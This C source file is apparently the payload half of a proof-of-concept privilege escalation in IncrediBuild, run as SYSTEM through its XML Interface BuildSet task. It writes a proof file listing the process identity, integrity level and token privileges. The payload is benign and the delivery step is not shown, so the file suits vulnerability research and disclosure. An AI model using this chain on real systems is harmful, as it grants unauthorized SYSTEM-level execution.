/*
 * sys_exec.c — Payload executed by IncrediBuild helper agent (SYSTEM)
 *              via the XML Interface BuildSet distributed task
 */
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

int main(int argc, char *argv[]) {
    /* Write proof-of-execution: who we are + all privileges */
    FILE *f = fopen("C:\\ProgramData\\ib_lpe_proof.txt", "w");
    if (!f) f = fopen("C:\\Windows\\Temp\\ib_lpe_proof.txt", "w");
    if (!f) return 1;

    fprintf(f, "=== IncrediBuild LPE via XML Interface BuildSet ===\n\n");

    /* Get current user */
    char user[256] = "?", domain[256] = "?";
    DWORD ul = sizeof(user), dl = sizeof(domain);
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BYTE buf[512]; DWORD sz = sizeof(buf);
        if (GetTokenInformation(hToken, TokenUser, buf, sz, &sz)) {
            SID_NAME_USE snu;
            LookupAccountSidA(NULL, ((TOKEN_USER*)buf)->User.Sid, user, &ul, domain, &dl, &snu);
        }

        /* Get integrity level */
        sz = sizeof(buf);
        if (GetTokenInformation(hToken, TokenIntegrityLevel, buf, sz, &sz)) {
            DWORD il = *GetSidSubAuthority(((TOKEN_MANDATORY_LABEL*)buf)->Label.Sid,
                        *GetSidSubAuthorityCount(((TOKEN_MANDATORY_LABEL*)buf)->Label.Sid) - 1);
            const char *ils = "Unknown";
            if      (il >= 0x4000) ils = "SYSTEM";
            else if (il >= 0x3000) ils = "High";
            else if (il >= 0x2000) ils = "Medium";
            else                   ils = "Low";
            fprintf(f, "Identity: %s\\%s\nIntegrity: %s (0x%08X)\n\n", domain, user, ils, il);
        }

        /* List enabled privileges */
        sz = sizeof(buf);
        BYTE priv_buf[2048]; DWORD priv_sz = sizeof(priv_buf);
        if (GetTokenInformation(hToken, TokenPrivileges, priv_buf, priv_sz, &priv_sz)) {
            TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES*)priv_buf;
            fprintf(f, "Privileges (%u):\n", (unsigned)tp->PrivilegeCount);
            for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
                char pname[128]; DWORD plen = sizeof(pname);
                LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, pname, &plen);
                const char *state = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "ENABLED" : "disabled";
                fprintf(f, "  %s: %s\n", pname, state);
            }
        }
        CloseHandle(hToken);
    }

    fprintf(f, "\nArgs (%d):\n", argc);
    for (int i = 0; i < argc; i++) fprintf(f, "  [%d] %s\n", i, argv[i]);
    fprintf(f, "\nCommandLine: %s\n", GetCommandLineA());

    fclose(f);
    return 0;
}
